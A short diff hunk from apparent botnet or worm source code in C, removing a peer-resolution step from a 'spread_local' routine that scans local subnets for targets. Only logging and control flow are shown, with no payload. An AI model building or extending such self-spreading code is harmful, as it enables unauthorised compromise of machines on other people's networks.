@@ -2564,11 +2564,6 @@ int spawn_scan_threads(notnet_bot_t *bot, const char *subnet, uint8_t service_ma
 int spread_local(notnet_bot_t *bot) {
     log_info("Local spread cycle started");
     
-    /* Resolve peers */
-    if (protocol_resolve_peers(bot) == 0 && bot->peer_count > 0) {
-        log_info("Using %d peers for spread", bot->peer_count);
-    }
-    
     /* Scan explicit targets if configured (overrides defaults) */
     if (bot->scan_target_count > 0) {
         log_info("Scanning %d explicit targets", bot->scan_target_count);
